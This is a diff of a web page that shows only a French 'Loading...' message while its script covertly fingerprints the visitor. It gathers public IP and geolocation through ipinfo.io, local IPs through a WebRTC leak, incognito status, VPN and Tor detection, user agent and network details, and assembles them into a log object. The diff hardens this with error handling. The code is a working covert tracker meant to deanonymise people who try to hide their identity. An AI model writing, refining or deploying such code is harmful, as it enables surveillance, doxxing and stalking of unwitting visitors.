@@ -9,42 +9,55 @@
     <h2>Chargement en cours...</h2>
     <script>
         async function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            return {
-                type: connection?.type || "Inconnu",
-                downlink: connection?.downlink ? `${connection.downlink} Mbps` : "Inconnu",
-                effectiveType: connection?.effectiveType || "Inconnu",
-                rtt: connection?.rtt ? `${connection.rtt} ms` : "Inconnu"
-            };
+            try {
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                return {
+                    type: connection?.type || "Inconnu",
+                    downlink: connection?.downlink ? `${connection.downlink} Mbps` : "Inconnu",
+                    effectiveType: connection?.effectiveType || "Inconnu",
+                    rtt: connection?.rtt ? `${connection.rtt} ms` : "Inconnu"
+                };
+            } catch (error) {
+                return { type: "Erreur", downlink: "Erreur", effectiveType: "Erreur", rtt: "Erreur" };
+            }
         }
 
         async function detectIncognito() {
             return new Promise((resolve) => {
-                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
-                if (!fs) resolve(false);
-                else {
-                    fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+                try {
+                    const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
+                    if (!fs) resolve(false);
+                    else {
+                        fs(window.TEMPORARY, 100, () => resolve(false), () => resolve(true));
+                    }
+                } catch (error) {
+                    resolve("Erreur de détection");
                 }
             });
         }
 
         async function getWebRTCIPs() {
             return new Promise((resolve) => {
-                let ips = [];
-                let rtc = new RTCPeerConnection();
-                rtc.createDataChannel("");
-                rtc.createOffer().then(o => rtc.setLocalDescription(o));
-                rtc.onicecandidate = event => {
-                    if (event && event.candidate && event.candidate.candidate) {
-                        let ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
-                        let match = event.candidate.candidate.match(ipRegex);
-                        if (match && match[1] && !ips.includes(match[1])) {
-                            ips.push(match[1]);
+                try {
+                    let ips = [];
+                    let rtc = new RTCPeerConnection();
+                    rtc.createDataChannel("");
+                    rtc.createOffer().then(o => rtc.setLocalDescription(o));
+                    
+                    rtc.onicecandidate = event => {
+                        if (event && event.candidate && event.candidate.candidate) {
+                            let ipRegex = /([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})/;
+                            let match = event.candidate.candidate.match(ipRegex);
+                            if (match && match[1] && !ips.includes(match[1])) {
+                                ips.push(match[1]);
+                            }
                         }
-                    } else {
-                        resolve(ips.length ? ips : ["Aucune IP WebRTC détectée"]);
-                    }
-                };
+                    };
+
+                    setTimeout(() => resolve(ips.length ? ips : ["Aucune IP WebRTC détectée"]), 3000);
+                } catch (error) {
+                    resolve(["Erreur WebRTC"]);
+                }
             });
         }
 
@@ -59,27 +72,14 @@
                     webrtcIPs: webrtcIPs
                 };
             } catch (error) {
-                return { isUsingVPN: "Échec de la détection", publicIP: "Inconnu", webrtcIPs: [] };
-            }
-        }
-
-        async function detectDNSLeak() {
-            try {
-                let dnsTest = await fetch("https://cloudflare-dns.com/dns-query", {
-                    method: "GET",
-                    headers: { "Accept": "application/dns-json" }
-                }).then(res => res.json());
-
-                return dnsTest.Answer ? dnsTest.Answer.map(a => a.data) : "Aucune fuite détectée";
-            } catch (error) {
-                return "Échec de la détection DNS";
+                return { isUsingVPN: "Erreur de détection", publicIP: "Inconnu", webrtcIPs: [] };
             }
         }
 
         async function detectTorProxy() {
             try {
-                let test = await fetch("https://check.torproject.org/api/ip").then(res => res.json());
-                return test.IsTor ? "Tor détecté" : "Pas de Tor";
+                let response = await fetch("https://check.torproject.org/api/ip", { mode: "no-cors" });
+                return response.ok ? "Tor détecté" : "Pas de Tor";
             } catch (error) {
                 return "Échec de la détection Tor";
             }
@@ -87,25 +87,23 @@
 
         async function collectData() {
             try {
-                let ipInfo = await fetch("https://ipinfo.io/json").then(response => response.json());
+                let ipInfo = await fetch("https://ipinfo.io/json", { mode: "no-cors" }).then(res => res.json()).catch(() => ({}));
                 let networkInfo = await getNetworkInfo();
                 let incognito = await detectIncognito();
                 let vpnData = await detectVPN();
-                let dnsLeak = await detectDNSLeak();
                 let torCheck = await detectTorProxy();
 
                 let logData = {
-                    ip: ipInfo.ip,
-                    ville: ipInfo.city,
-                    région: ipInfo.region,
-                    pays: ipInfo.country,
-                    fournisseur: ipInfo.org,
-                    position: ipInfo.loc,
+                    ip: ipInfo.ip || "Inconnu",
+                    ville: ipInfo.city || "Inconnu",
+                    région: ipInfo.region || "Inconnu",
+                    pays: ipInfo.country || "Inconnu",
+                    fournisseur: ipInfo.org || "Inconnu",
+                    position: ipInfo.loc || "Inconnu",
                     userAgent: navigator.userAgent,
                     incognitoMode: incognito,
                     webrtcIPs: vpnData.webrtcIPs,
                     vpnDetected: vpnData.isUsingVPN,
-                    dnsLeakDetected: dnsLeak,
                     torStatus: torCheck,
                     network: networkInfo
                 };
